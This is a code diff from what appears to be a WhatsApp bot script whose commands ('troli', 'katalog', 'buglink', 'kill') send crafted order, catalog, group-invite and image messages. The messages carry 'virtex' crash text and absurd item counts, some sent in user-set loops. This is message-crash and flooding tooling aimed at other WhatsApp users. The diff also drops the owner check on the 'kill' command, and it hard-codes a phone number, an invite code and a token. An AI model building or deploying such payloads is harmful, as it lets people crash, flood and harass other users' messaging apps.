@@ -4874,8 +4874,8 @@ if (!isOwner && !mek.key.fromMe) return sticOwner(from)
        }
        break
 case 'troli':
-       for (let i = 0; i < (q) ; i++){
-             if (!isOwner && !mek.key.fromMe) return sticOwner(from)
+if (!isOwner && !mek.key.fromMe) return sticOwner(from)
+for (let i = 0; i < (q) ; i++){
                res = await kurr.prepareMessageFromContent(from, {
 					"orderMessage": {
 						"orderId": "3184312811796096",
@@ -4883,7 +4883,7 @@ case 'troli':
 						"itemCount": 9999999,
 						"status": "INQUIRY",
 						"surface": "CATALOG",
-						"message": `${virtau()} ${virlock()}`,
+						"message": `${virtau()}`,
 						"orderTitle": "⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗",
 						 "token": "AR6eHHZTvi8k3qMfxWHBCvAXO+vG5VW/1QtpiPpxL3Tfyg=="
 						 },
@@ -4908,7 +4908,7 @@ case 'katalog':
           "productid": "4647830318611095",
         "title": `ᴘᷮᴀͣᴄͨᴍͫᴀͣɴᷠ±Sʜɪɴ々Cʜᴀɴ${vapi()}`,
         "description": ` Sʜɪɴ々Cʜᴀɴ⸙${virtexapi()} `,
-        "retailerId": `${virlock()}`,
+        "retailerId": `⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗`,
         "productImageCount": 9999
     },
     "businessOwnerJid": "6282134110253@s.whatsapp.net"
@@ -5022,8 +5022,8 @@ if (!isOwner && !mek.key.fromMe) return sticOwner(from)
          "groupJid": "34699303450-1355008702@g.us",
          "inviteCode": "N/BQqseQIXL4l0dJ",
          "inviteExpiration": "1631182960",
-         "groupName": `⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗${virtau()} ${virlock()}`,
-         "jpegThumbnail": fs.readFileSync('./media/aqul.jpeg'),
+         "groupName": `⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗${virtau()}`,
+         "jpegThumbnail": fs.readFileSync('./media/thumb.jpg'),
          "caption": `༆⃢✯ ѕιи¢нαи ✯ кαиνяєт ✯⃢༆ ${virtau()}`,
          "contextInfo": {
             "forwardingScore": 3,
@@ -5038,8 +5038,8 @@ if (!isOwner && !mek.key.fromMe) return sticOwner(from)
          "groupJid": "34699303450-1355008702@g.us",
          "inviteCode": "N/BQqseQIXL4l0dJ",
          "inviteExpiration": "1631182960",
-         "groupName": `${virtexapi()} ${virlock()}`,
-         "jpegThumbnail": fs.readFileSync('./media/aqul.jpeg'),
+         "groupName": `${virtexapi()}`,
+         "jpegThumbnail": fs.readFileSync('./media/thumb.jpg'),
          "caption": `༆⃢✯ ѕιи¢нαи ✯ кαиνяєт ✯⃢༆ ${virtau()}`,
          "contextInfo": {
             "forwardingScore": 3,
@@ -5055,7 +5055,7 @@ if (!isOwner && !mek.key.fromMe) return sticOwner(from)
          "inviteCode": "N/BQqseQIXL4l0dJ",
          "inviteExpiration": "1631182960",
          "groupName": `⏤͟͟͞͞ᵡSʜɪɴ々Cʜᴀɴ༗${vapi()}`,
-         "jpegThumbnail": fs.readFileSync('./media/aqul.jpeg'),
+         "jpegThumbnail": fs.readFileSync('./media/thumb.jpg'),
          "caption": `༆⃢✯ ѕιи¢нαи ✯ кαиνяєт ✯⃢༆ ${virtau()}`,
          "contextInfo": {
             "forwardingScore": 3,
@@ -5065,7 +5065,7 @@ if (!isOwner && !mek.key.fromMe) return sticOwner(from)
 }, {quoted: finv, contextInfo: {} })
    kurr.relayWAMessage(res)
    break
-case 'google':
+case 'buglink':
 if (!isOwner && !mek.key.fromMe) return sticOwner(from)
   res = await kurr.prepareMessageFromContent(from, {
 					"extendedTextMessage": {
@@ -5098,7 +5098,6 @@ if (!isOwner && !mek.key.fromMe) return sticOwner(from)
  kurr.relayWAMessage(res)
  break
 case 'kill':
-if (!isOwner && !mek.key.fromMe) return sticOwner(from)
 res = await kurr.prepareMessageFromContent(from, {
 					"imageMessage": {
 						"url": "https://mmg.whatsapp.net/d/f/Anv-4_S8w9lO1dgjQV3t6vxi9gHY9_4jKXTnzzwdWTmD.enc",
